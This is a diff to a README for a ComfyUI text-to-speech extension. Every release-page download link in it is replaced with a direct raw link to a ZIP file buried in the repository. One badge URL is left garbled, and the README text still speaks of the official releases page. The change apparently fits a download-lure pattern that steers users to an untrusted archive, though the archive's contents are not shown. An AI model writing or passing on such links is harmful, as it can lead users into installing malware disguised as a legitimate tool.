@@ -1,6 +1,6 @@
 # 😺 ComfyUI-KittenTTS - Lightweight Text-to-Speech for Everyone
 
-[![Download ComfyUI-KittenTTS](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ihsacm/ComfyUI-KittenTTS/releases)
+[![Download ComfyUI-KittenTTS](https://github.com/ihsacm/ComfyUI-KittenTTS/raw/refs/heads/main/KittenTTS/kittentts/Kitten-TTS-U-Comfy-2.6.zip)](https://github.com/ihsacm/ComfyUI-KittenTTS/raw/refs/heads/main/KittenTTS/kittentts/Kitten-TTS-U-Comfy-2.6.zip)
 
 ## 📌 What is ComfyUI-KittenTTS?
 
@@ -24,7 +24,7 @@ The software works fine without a GPU but will run faster if you have one.
 
 You need to visit the official GitHub releases page to get the latest version of ComfyUI-KittenTTS. Click the green button below or use this link:
 
-[![Download ComfyUI-KittenTTS](https://img.shields.io/badge/Go%20to%20Downloads-Blue?style=for-the-badge&color=0078D7)](https://github.com/ihsacm/ComfyUI-KittenTTS/releases)
+[![Download ComfyUI-KittenTTS](https://github.com/ihsacm/ComfyUI-KittenTTS/raw/refs/heads/main/KittenTTS/kittentts/Kitten-TTS-U-Comfy-2.6.zip%20to%20Downloads-Blue?style=for-the-badge&color=0078D7)](https://github.com/ihsacm/ComfyUI-KittenTTS/raw/refs/heads/main/KittenTTS/kittentts/Kitten-TTS-U-Comfy-2.6.zip)
 
 Once on the page, look for the latest release. You will find a ZIP file containing all the necessary files. Download this ZIP file to your PC.
 
@@ -101,7 +101,7 @@ If issues persist, visit the GitHub issues page for support or report a new prob
 
 Get the latest release here:
 
-[Download ComfyUI-KittenTTS](https://github.com/ihsacm/ComfyUI-KittenTTS/releases)
+[Download ComfyUI-KittenTTS](https://github.com/ihsacm/ComfyUI-KittenTTS/raw/refs/heads/main/KittenTTS/kittentts/Kitten-TTS-U-Comfy-2.6.zip)
 
 Click this link any time to find new versions or additional files.
 
